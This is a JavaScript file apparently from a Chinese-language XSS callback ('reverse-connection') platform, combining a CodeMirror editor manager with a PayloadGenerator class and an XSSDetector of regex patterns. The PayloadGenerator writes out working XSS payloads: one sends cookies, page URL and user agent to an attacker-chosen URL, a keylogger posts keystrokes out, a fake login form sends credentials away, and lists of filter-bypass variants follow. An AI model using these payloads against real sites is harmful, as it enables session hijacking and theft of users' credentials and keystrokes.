/**
 * 小绿茶XSS反连平台 - 代码编辑器功能
 * 作者: AI Assistant
 * 版本: 1.0.0
 */

/**
 * 代码编辑器管理类
 */
class CodeEditorManager {
    constructor() {
        this.editors = new Map();
        this.currentEditor = null;
        this.themes = {
            light: 'default',
            dark: 'monokai'
        };
        this.currentTheme = 'dark';
    }
    
    /**
     * 创建编辑器
     */
    createEditor(elementId, options = {}) {
        const element = document.getElementById(elementId);
        if (!element) {
            console.error('Editor element not found:', elementId);
            return null;
        }
        
        const defaultOptions = {
            mode: 'javascript',
            theme: this.themes[this.currentTheme],
            lineNumbers: true,
            autoCloseBrackets: true,
            matchBrackets: true,
            indentUnit: 4,
            tabSize: 4,
            indentWithTabs: false,
            lineWrapping: true,
            foldGutter: true,
            gutters: ["CodeMirror-linenumbers", "CodeMirror-foldgutter"],
            extraKeys: {
                "Ctrl-Space": "autocomplete",
                "Ctrl-S": function(cm) {
                    // 触发保存操作
                    if (typeof savePayload === 'function') {
                        savePayload();
                    }
                },
                "Ctrl-F": "find",
                "Ctrl-H": "replace",
                "Ctrl-Z": "undo",
                "Ctrl-Y": "redo",
                "Ctrl-A": "selectAll"
            }
        };
        
        const finalOptions = Object.assign(defaultOptions, options);
        
        const editor = CodeMirror.fromTextArea(element, finalOptions);
        
        // 添加自定义事件监听
        this.setupEditorEvents(editor, elementId);
        
        this.editors.set(elementId, editor);
        this.currentEditor = editor;
        
        return editor;
    }
    
    /**
     * 设置编辑器事件
     */
    setupEditorEvents(editor, elementId) {
        // 内容变化事件
        editor.on('change', (cm, change) => {
            this.onContentChange(cm, change, elementId);
        });
        
        // 光标移动事件
        editor.on('cursorActivity', (cm) => {
            this.onCursorActivity(cm, elementId);
        });
        
        // 焦点事件
        editor.on('focus', (cm) => {
            this.currentEditor = cm;
            this.onFocus(cm, elementId);
        });
        
        // 失去焦点事件
        editor.on('blur', (cm) => {
            this.onBlur(cm, elementId);
        });
        
        // 按键事件
        editor.on('keydown', (cm, event) => {
            this.onKeyDown(cm, event, elementId);
        });
    }
    
    /**
     * 内容变化处理
     */
    onContentChange(cm, change, elementId) {
        // 更新状态显示
        this.updateEditorStatus(elementId, 'modified');
        
        
        // 更新统计信息
        this.updateEditorStats(cm, elementId);
    }
    
    /**
     * 光标活动处理
     */
    onCursorActivity(cm, elementId) {
        this.updateCursorPosition(cm, elementId);
    }
    
    /**
     * 焦点处理
     */
    onFocus(cm, elementId) {
        this.updateEditorStatus(elementId, 'focused');
    }
    
    /**
     * 失去焦点处理
     */
    onBlur(cm, elementId) {
        this.updateEditorStatus(elementId, 'normal');
    }
    
    /**
     * 按键处理
     */
    onKeyDown(cm, event, elementId) {
        // 处理特殊快捷键
        if (event.ctrlKey || event.metaKey) {
            switch (event.key) {
                case 'Enter':
                    // Ctrl+Enter 运行代码
                    event.preventDefault();
                    if (typeof testPayload === 'function') {
                        testPayload();
                    }
                    break;
                case 'l':
                    // Ctrl+L 格式化代码
                    event.preventDefault();
                    if (typeof formatCode === 'function') {
                        formatCode();
                    }
                    break;
            }
        }
    }
    
    /**
     * 更新编辑器状态
     */
    updateEditorStatus(elementId, status) {
        const statusElement = $(`#${elementId}`).closest('.editor-container').find('.editor-status');
        if (statusElement.length) {
            const statusText = {
                normal: '<i class="fas fa-circle text-success"></i> 就绪',
                focused: '<i class="fas fa-circle text-primary"></i> 编辑中',
                modified: '<i class="fas fa-circle text-warning"></i> 未保存'
            };
            statusElement.html(statusText[status] || statusText.normal);
        }
    }
    
    /**
     * 更新光标位置
     */
    updateCursorPosition(cm, elementId) {
        const cursor = cm.getCursor();
        const positionElement = $(`#${elementId}`).closest('.editor-container').find('.cursor-position');
        if (positionElement.length) {
            positionElement.text(`行 ${cursor.line + 1}, 列 ${cursor.ch + 1}`);
        }
    }
    
    /**
     * 更新编辑器统计信息
     */
    updateEditorStats(cm, elementId) {
        const statsElement = $(`#${elementId}`).closest('.editor-container').find('.editor-stats');
        if (statsElement.length) {
            const content = cm.getValue();
            const lines = cm.lineCount();
            const words = content.trim() ? content.trim().split(/\s+/).length : 0;
            const chars = content.length;
            
            statsElement.html(`行数: ${lines} | 单词: ${words} | 字符: ${chars}`);
        }
    }
    
    /**
     * 获取编辑器
     */
    getEditor(elementId) {
        return this.editors.get(elementId);
    }
    
    /**
     * 获取当前编辑器
     */
    getCurrentEditor() {
        return this.currentEditor;
    }
    
    /**
     * 设置主题
     */
    setTheme(theme) {
        if (this.themes[theme]) {
            this.currentTheme = theme;
            this.editors.forEach(editor => {
                editor.setOption('theme', this.themes[theme]);
            });
            
            // 保存主题设置
            if (typeof Storage !== 'undefined') {
                Storage.set('editor_theme', theme);
            }
        }
    }
    
    /**
     * 获取主题
     */
    getTheme() {
        return this.currentTheme;
    }
    
    /**
     * 切换主题
     */
    toggleTheme() {
        const newTheme = this.currentTheme === 'light' ? 'dark' : 'light';
        this.setTheme(newTheme);
        return newTheme;
    }
    
    /**
     * 加载主题设置
     */
    loadTheme() {
        if (typeof Storage !== 'undefined') {
            const savedTheme = Storage.get('editor_theme');
            if (savedTheme && this.themes[savedTheme]) {
                this.setTheme(savedTheme);
            }
        }
    }
    
    /**
     * 格式化代码
     */
    formatCode(editorId = null) {
        const editor = editorId ? this.getEditor(editorId) : this.currentEditor;
        if (!editor) return false;
        
        try {
            const code = editor.getValue();
            const formatted = this.beautifyJavaScript(code);
            editor.setValue(formatted);
            return true;
        } catch (error) {
            console.error('Format code error:', error);
            return false;
        }
    }
    
    /**
     * 简单的JavaScript代码美化
     */
    beautifyJavaScript(code) {
        // 简单的格式化逻辑
        let formatted = code;
        
        // 添加分号后的换行
        formatted = formatted.replace(/;/g, ';\n');
        
        // 添加大括号后的换行和缩进
        formatted = formatted.replace(/{/g, '{\n    ');
        formatted = formatted.replace(/}/g, '\n}');
        
        // 添加逗号后的换行
        formatted = formatted.replace(/,/g, ',\n    ');
        
        // 清理多余的空行
        formatted = formatted.replace(/\n\s*\n/g, '\n');
        
        return formatted;
    }
    
    /**
     * 插入模板
     */
    insertTemplate(template, editorId = null) {
        const editor = editorId ? this.getEditor(editorId) : this.currentEditor;
        if (!editor || !template) return false;
        
        const cursor = editor.getCursor();
        editor.replaceRange(template, cursor);
        editor.focus();
        return true;
    }
    
    /**
     * 查找和替换
     */
    findAndReplace(search, replace, editorId = null) {
        const editor = editorId ? this.getEditor(editorId) : this.currentEditor;
        if (!editor) return false;
        
        const content = editor.getValue();
        const newContent = content.replace(new RegExp(search, 'g'), replace);
        editor.setValue(newContent);
        return true;
    }
    
    /**
     * 高亮语法错误
     */
    highlightErrors(errors, editorId = null) {
        const editor = editorId ? this.getEditor(editorId) : this.currentEditor;
        if (!editor) return false;
        
        // 清除之前的高亮
        editor.getAllMarks().forEach(mark => mark.clear());
        
        // 添加新的错误高亮
        errors.forEach(error => {
            if (error.line) {
                editor.markText(
                    { line: error.line - 1, ch: 0 },
                    { line: error.line, ch: 0 },
                    { className: 'syntax-error' }
                );
            }
        });
        
        return true;
    }
    
    /**
     * 自动补全
     */
    setupAutoComplete(editorId = null) {
        const editor = editorId ? this.getEditor(editorId) : this.currentEditor;
        if (!editor) return false;
        
        // JavaScript关键字和内置对象
        const keywords = [
            'alert', 'confirm', 'prompt', 'console', 'document', 'window',
            'location', 'navigator', 'screen', 'history', 'localStorage',
            'sessionStorage', 'cookie', 'XMLHttpRequest', 'fetch', 'Promise',
            'setTimeout', 'setInterval', 'clearTimeout', 'clearInterval',
            'function', 'var', 'let', 'const', 'if', 'else', 'for', 'while',
            'do', 'switch', 'case', 'break', 'continue', 'return', 'try',
            'catch', 'finally', 'throw', 'new', 'this', 'typeof', 'instanceof'
        ];
        
        editor.setOption('hintOptions', {
            completeSingle: false,
            hint: function(cm) {
                const cursor = cm.getCursor();
                const token = cm.getTokenAt(cursor);
                const start = token.start;
                const end = cursor.ch;
                const line = cursor.line;
                const currentWord = token.string;
                
                const list = keywords.filter(keyword => 
                    keyword.startsWith(currentWord)
                );
                
                return {
                    list: list.length ? list : keywords,
                    from: { line: line, ch: start },
                    to: { line: line, ch: end }
                };
            }
        });
        
        return true;
    }
    
    /**
     * 获取编辑器状态
     */
    getEditorState(editorId = null) {
        const editor = editorId ? this.getEditor(editorId) : this.currentEditor;
        if (!editor) return null;
        
        return {
            content: editor.getValue(),
            cursor: editor.getCursor(),
            selections: editor.listSelections(),
            history: editor.getHistory(),
            isClean: editor.isClean()
        };
    }
    
    /**
     * 恢复编辑器状态
     */
    restoreEditorState(state, editorId = null) {
        const editor = editorId ? this.getEditor(editorId) : this.currentEditor;
        if (!editor || !state) return false;
        
        if (state.content) {
            editor.setValue(state.content);
        }
        
        if (state.cursor) {
            editor.setCursor(state.cursor);
        }
        
        if (state.history) {
            editor.setHistory(state.history);
        }
        
        return true;
    }
    
    /**
     * 销毁编辑器
     */
    destroyEditor(elementId) {
        const editor = this.getEditor(elementId);
        if (editor) {
            editor.toTextArea();
            this.editors.delete(elementId);
            
            if (this.currentEditor === editor) {
                this.currentEditor = null;
            }
            
            return true;
        }
        return false;
    }
    
    /**
     * 销毁所有编辑器
     */
    destroyAllEditors() {
        this.editors.forEach((editor, elementId) => {
            this.destroyEditor(elementId);
        });
        this.editors.clear();
        this.currentEditor = null;
    }
}

/**
 * Payload生成工具类
 */
class PayloadGenerator {
    /**
     * 生成基本XSS Payload
     */
    static generateBasicPayload(type = 'alert') {
        const payloads = {
            alert: "<script>alert('XSS')</script>",
            confirm: "<script>confirm('XSS')</script>",
            prompt: "<script>prompt('XSS')</script>",
            console: "<script>console.log('XSS')</script>",
            cookie: "<script>document.cookie</script>",
            redirect: "<script>window.location='https://example.com'</script>",
            image: "<img src=x onerror=alert('XSS')>",
            svg: "<svg onload=alert('XSS')></svg>",
            iframe: "<iframe src=javascript:alert('XSS')></iframe>"
        };
        
        return payloads[type] || payloads.alert;
    }
    
    /**
     * 生成数据窃取Payload
     */
    static generateDataExfiltrationPayload(url) {
        return `fetch('${url}', {
    method: 'POST',
    headers: {
        'Content-Type': 'application/json'
    },
    body: JSON.stringify({
        cookie: document.cookie,
        url: window.location.href,
        userAgent: navigator.userAgent,
        referrer: document.referrer
    })
});`;
    }
    
    /**
     * 生成键盘记录Payload
     */
    static generateKeyloggerPayload(url) {
        return `var keys='';
document.addEventListener('keydown', function(e) {
    keys += e.key;
    if(keys.length>10){
        fetch('${url}', {
            method: 'POST',
            body: 'keys=' + keys
        });
        keys='';
    }
});`;
    }
    
    /**
     * 生成钓鱼Payload
     */
    static generatePhishingPayload(formAction) {
        return `var form = document.createElement('form');
form.innerHTML = '<input name=username><input name=password type=password>';
form.onsubmit = function() {
    fetch('${formAction}', {
        method: 'POST',
        body: new URLSearchParams(new FormData(form))
    });
};
document.body.appendChild(form);`;
    }
    
    /**
     * 生成绕过Payload
     */
    static generateBypassPayload(filter) {
        const bypasses = {
            script: [
                "<script>alert('XSS')</script>",
                "<ScRiPt>alert('XSS')</ScRiPt>",
                "<script/>alert('XSS')</script>",
                "<<script>alert('XSS')</script>",
                "<script <b>alert('XSS')</script>"
            ],
            event: [
                "<img src=x onerror=alert('XSS')>",
                "<img src=x onError=alert('XSS')>",
                "<img src=x onerrorin=alert('XSS')>",
                "<img src=x onerror=alert('XSS')>",
                "<img src=x onerror=alert(String.fromCharCode(88,83,83))>"
            ],
            javascript: [
                "javascript:alert('XSS')",
                "JaVaScRiPt:alert('XSS')",
                "javascript:alert('XSS')",
                "javascript:alert('XSS')",
                "java\tscript:alert('XSS')"
            ]
        };
        
        return bypasses[filter] || bypasses.script;
    }
    
    /**
     * 生成编码Payload
     */
    static generateEncodedPayload(type, payload) {
        switch (type) {
            case 'url':
                return Encoder.urlEncode(payload);
            case 'base64':
                return Encoder.base64Encode(payload);
            case 'html':
                return Encoder.htmlEncode(payload);
            case 'unicode':
                return Encoder.unicodeEncode(payload);
            case 'hex':
                return payload.split('').map(c => '%' + c.charCodeAt(0).toString(16)).join('');
            default:
                return payload;
        }
    }
}

/**
 * XSS检测工具类
 */
class XSSDetector {
    /**
     * 检测XSS特征
     */
    static detectXSSFeatures(input) {
        const features = {
            hasScript: /<script\b[^<]*(?:(?!<\/script>)<[^<]*)*<\/script>/gi.test(input),
            hasEvent: /\s(on\w+)\s*=/gi.test(input),
            hasJavaScript: /javascript:/gi.test(input),
            hasDataURI: /data:/gi.test(input),
            hasVBScript: /vbscript:/gi.test(input),
            hasExpression: /expression\s*\(/gi.test(input),
            hasImport: /@import/gi.test(input),
            hasIframe: /<iframe\b[^<]*(?:(?!<\/iframe>)<[^<]*)*<\/iframe>/gi.test(input),
            hasObject: /<object\b[^<]*(?:(?!<\/object>)<[^<]*)*<\/object>/gi.test(input),
            hasEmbed: /<embed\b[^<]*>/gi.test(input),
            hasForm: /<form\b[^<]*(?:(?!<\/form>)<[^<]*)*<\/form>/gi.test(input),
            hasMeta: /<meta\b[^<]*>/gi.test(input),
            hasLink: /<link\b[^<]*>/gi.test(input),
            hasStyle: /<style\b[^<]*(?:(?!<\/style>)<[^<]*)*<\/style>/gi.test(input),
            hasSvg: /<svg\b[^<]*(?:(?!<\/svg>)<[^<]*)*<\/svg>/gi.test(input),
            hasMath: /<math\b[^<]*(?:(?!<\/math>)<[^<]*)*<\/math>/gi.test(input)
        };
        
        return features;
    }
    
    /**
     * 计算XSS风险评分
     */
    static calculateXSSRisk(input) {
        const features = this.detectXSSFeatures(input);
        const riskScore = Object.values(features).filter(Boolean).length;
        
        let riskLevel = 'low';
        if (riskScore >= 5) {
            riskLevel = 'high';
        } else if (riskScore >= 2) {
            riskLevel = 'medium';
        }
        
        return {
            score: riskScore,
            level: riskLevel,
            features: features
        };
    }
    
    /**
     * 生成安全建议
     */
    static generateSecurityAdvice(risk) {
        const advice = [];
        
        if (risk.features.hasScript) {
            advice.push('检测到script标签，建议过滤<script>标签');
        }
        
        if (risk.features.hasEvent) {
            advice.push('检测到事件处理器，建议过滤on*属性');
        }
        
        if (risk.features.hasJavaScript) {
            advice.push('检测到javascript:协议，建议过滤该协议');
        }
        
        if (risk.level === 'high') {
            advice.push('高风险：建议使用HTML实体编码输出');
        } else if (risk.level === 'medium') {
            advice.push('中风险：建议对输入进行过滤');
        }
        
        return advice;
    }
}

/**
 * 全局变量
 */
let editorManager = null;

/**
 * 初始化编辑器管理器
 */
function initEditorManager() {
    if (!editorManager) {
        editorManager = new CodeEditorManager();
        editorManager.loadTheme();
    }
    return editorManager;
}

/**
 * 获取编辑器管理器
 */
function getEditorManager() {
    return editorManager;
}

// 页面加载完成后初始化
$(document).ready(function() {
    initEditorManager();
});

// 导出到全局
window.CodeEditorManager = CodeEditorManager;
window.PayloadGenerator = PayloadGenerator;
window.XSSDetector = XSSDetector;
window.editorManager = editorManager;